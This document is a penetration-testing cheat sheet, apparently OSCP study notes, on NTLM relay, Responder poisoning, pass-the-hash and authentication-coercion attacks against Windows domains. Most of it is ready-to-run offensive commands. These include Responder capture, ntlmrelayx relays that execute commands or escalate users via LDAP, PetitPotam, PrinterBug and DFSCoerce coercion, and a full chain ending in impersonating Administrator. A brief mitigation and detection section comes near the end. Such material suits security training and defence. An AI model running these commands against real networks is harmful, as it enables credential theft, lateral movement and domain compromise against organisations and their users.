# NTLM Relay & Responder Attacks

## Table of Contents
- [NTLM Overview](#ntlm-overview)
- [Responder Setup](#responder-setup)
- [NTLM Relay Attack](#ntlm-relay-attack)
- [Pass-the-Hash](#pass-the-hash)
- [Authentication Coercion](#authentication-coercion)
- [Advanced: Responder + Relay Chain](#advanced-responder--relay-chain)
- [Mitigation & Detection](#mitigation--detection)

---

## NTLM Overview

### NTLM Authentication Flow

**Challenge-Response Protocol:**
1. Client sends username
2. Server sends random challenge (nonce)
3. Client encrypts challenge with NTLM hash (Key = NTLM(password))
4. Server compares response with expected value

**Vulnerability:** NTLM hash is reusable across network without password

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---------|--------|--------|
| Hash Type | MD4 | HMAC-MD5 |
| Response Type | Single DES encryption | Timestamp-based |
| Cracking Time | Minutes (weak) | Hours to days |
| Relay Vulnerability | Very susceptible | Can be relayed with signing disabled |

---

## Responder Setup

### Installation

> Install Responder on Kali
```shell
git clone https://github.com/lgandx/Responder /opt/Responder
cd /opt/Responder
chmod +x Responder.py
```

### Basic Responder Attack

> Start Responder to capture credentials (SMB, HTTP, MSSQL, FTP)
```shell
sudo python3 Responder.py -I eth0 -wv
```

**Flags:**
- `-I eth0`: Interface to listen on
- `-w`: Enable WPAD spoofing (auto-proxy discovery)
- `-v`: Verbose output
- `-d`: DHCP spoofing
- `-f`: Force authentication even on known hosts

> Listen on specific protocols only
```shell
sudo python3 Responder.py -I eth0 -SMB -HTTP -FTP
```

### Capture NTLM Hashes

> Responder will dump captured hashes to:
```shell
ls -la /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.100.txt
```

**Hash Format (NTLMv2):**
```
username::DOMAIN:CHALLENGE:RESPONSE
```

### Force Authentication with Name Resolution

> Use DNS spoofing to redirect connections
```shell
sudo python3 Responder.py -I eth0 -w -d -f
```

> Trigger auth via SMB (if on same network)
```shell
net view \\fake-server.local
```

> Trigger via HTTP (WPAD request)
```
Browser auto-proxy discovery will force NTLM auth to Responder
```

---

## NTLM Relay Attack

### Concept
Instead of cracking NTLM hash, **relay it directly** to another service. Requires SMB signing disabled on target.

### ntlmrelayx (Impacket)

> Setup NTLM relay to SMB target
```shell
impacket-ntlmrelayx -t smb://$rhost -smb2support
```

> Trigger victim to authenticate to attacker (via Responder)
```shell
# In another terminal, start Responder
sudo python3 Responder.py -I eth0 -wv
```

> Once relayed, execute commands on target
```shell
impacket-ntlmrelayx -t smb://$rhost -smb2support -c "powershell.exe -e BASE64_ENCODED_COMMAND"
```

### NTLM Relay to MSSQL

> Relay SMB authentication to MSSQL
```shell
impacket-ntlmrelayx -t mssql://$rhost -smb2support
```

> Dump database after relay
```shell
impacket-ntlmrelayx -t mssql://$rhost -smb2support -q "select * from sysusers"
```

### NTLM Relay to LDAP (AD Compromise)

> Relay to LDAP for privilege escalation
```shell
impacket-ntlmrelayx -t ldap://$domain_controller -smb2support --escalate-user $username
```

> This adds target user to privileged group (requires DA account relayed)

### Interactive Shell after Relay

> Setup SOCKS proxy after successful relay
```shell
impacket-ntlmrelayx -t smb://$rhost -smb2support -socks
```

> Access relayed machine via SOCKS
```shell
# In another terminal
proxychains impacket-psexec -k -no-pass $domain/$username@$rhost
```

---

## Pass-the-Hash

> **ðŸ“– For complete Pass-the-Hash techniques, see [Password Attacks - Pass the Hash](3.2.Password-Attacks.md#pass-the-hash)**

### Quick Reference

| Tool | Command |
|:-----|:--------|
| impacket-psexec | `impacket-psexec -hashes :NTLM_HASH $domain/user@$rhost` |
| impacket-wmiexec | `impacket-wmiexec -hashes :NTLM_HASH $domain/user@$rhost` |
| evil-winrm | `evil-winrm -i $rhost -u user -H NTLM_HASH` |
| nxc | `nxc smb $rhost -u user -H NTLM_HASH` |
| xfreerdp | `xfreerdp /u:user /pth:NTLM_HASH /v:$rhost` |

---

## Authentication Coercion

### Coercer (Universal Coercion Tool)

> Install Coercer
```shell
pip3 install coercer
```

> Scan for available coercion methods
```shell
coercer scan -t $rhost -u $username -p $password -d $domain
```

> Execute all coercion methods
```shell
coercer coerce -t $rhost -l $lhost -u $username -p $password -d $domain
```

### PetitPotam (MS-EFSR)

> Unauthenticated PetitPotam (CVE-2021-36942)
```shell
python3 PetitPotam.py $lhost $rhost
```

> Authenticated PetitPotam
```shell
python3 PetitPotam.py -u $username -p $password -d $domain $lhost $rhost
```

### PrinterBug / SpoolSample (MS-RPRN)

> Force target to authenticate back (print spooler must be running)
```shell
python3 printerbug.py $domain/$username:$password@$rhost $lhost
```

> Impacket version
```shell
impacket-printerbug $domain/$username:$password@$rhost $lhost
```

### DFSCoerce (MS-DFSNM)

> Force authentication via DFS service
```shell
python3 dfscoerce.py -u $username -p $password -d $domain $lhost $rhost
```

### ShadowCoerce (MS-FSRVP)

> Force authentication via File Server VSS Agent Service
```shell
python3 shadowcoerce.py -u $username -p $password -d $domain $lhost $rhost
```

### Coercion + NTLM Relay Attack Chain

**Step 1: Start NTLM Relay to LDAP**
```shell
impacket-ntlmrelayx -t ldaps://$domain_controller --delegate-access --escalate-user $low_priv_user
```

**Step 2: Trigger coercion from DC**
```shell
python3 PetitPotam.py $lhost $domain_controller
```

**Step 3: Abuse new privileges**
```shell
# If RBCD was configured, use S4U2Proxy
impacket-getST -dc-ip $domain_controller -spn cifs/$domain_controller -impersonate Administrator $domain/$low_priv_user
```

---

## Advanced: Responder + Relay Chain

### Full Attack Workflow

**Step 1: Start Responder**
```shell
sudo python3 Responder.py -I eth0 -wv
```

**Step 2: Start NTLM Relay**
```shell
impacket-ntlmrelayx -t smb://$target_rhost -smb2support -c "whoami > C:\proof.txt"
```

**Step 3: Trigger authentication (via printer bug, WPAD, etc.)**
```shell
# Example: Trigger via UNC path access
# Victim tries to access \\attacker-ip\share
# Responder intercepts, relay forwards to target
```

**Step 4: Verify command execution**
```shell
# Access relayed SMB share
impacket-smbclient //$target_rhost/c$ -k -no-pass
cat C:\proof.txt
```

---

## Mitigation & Detection

### Enable SMB Signing

> Check current SMB signing status
```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature
```

> Enable SMB signing on servers
```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

### Disable NTLM (Force Kerberos)

> Policy to restrict NTLM
```powershell
Set-GPRegistryValue -Name "Restrict NTLM" -Key "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" `
  -ValueName "RestrictNTLMInDomain" -Value 1
```

### Network Detection

> Monitor for Responder activity (LLMNR/NBT-NS spoofing)
```powershell
# Check for unusual LLMNR/NBT-NS responses in network
Get-WinEvent -LogName "Security" -FilterHashtable @{EventID=4648} | 
  Where-Object {$_.Message -match "NTLM"} | Select-Object TimeCreated, Message
```

> Block LLMNR queries in firewall
```powershell
New-NetFirewallRule -DisplayName "Block LLMNR" -Direction Inbound -LocalPort 5355 -Protocol UDP -Action Block
```

### Event Log Monitoring

| Event ID | Meaning |
|----------|---------|
| 4624 | Account logged in (check unusual source IPs) |
| 4688 | Process created (watch for relay tool processes) |
| 4648 | Logon with explicit credentials (relay signature) |
| 4768, 4769 | Kerberos events (fallback from NTLM) |

---

## Responder Configuration

> Advanced Responder config options
```shell
# Edit /etc/responder/Responder.conf
[Responder Core]
Responder IP = eth0        # Interface to use
Listen On IPv6 = Off       # IPv6 support
[LLMNR Spoofing]
LLMNR = On                 # Link-Local Multicast Name Resolution
[NBT-NS Spoofing]  
NBT-NS = On                # NetBIOS Name Service
[MDNS Spoofing]
MDNS = On                  # Multicast DNS
```

> Restart with custom config
```shell
sudo python3 Responder.py -I eth0 -c /path/to/custom.conf
```

---

## See Also

### Related AD Exploitation Files
- **[AD Exploitation Overview](3.1.AD-Exploitation.md)** - Full AD attack methodology, ACL abuse, BloodHound
- **[Password Attacks](3.2.Password-Attacks.md)** - NTLMv2 cracking with hashcat/john
- **[Kerberos Attacks](3.3.Kerberos-Attacks.md)** - ASREPRoast, Kerberoasting, Golden/Silver Tickets

### Post-Exploitation
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Use captured hashes for PSExec, WMI
- **[Ligolo-ng Complete Guide](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Tunnel through relayed connections

### OSCP Preparation
- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - Real AD attack chains
- **[Exam Tips & Tricks](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Credential hunting methodology
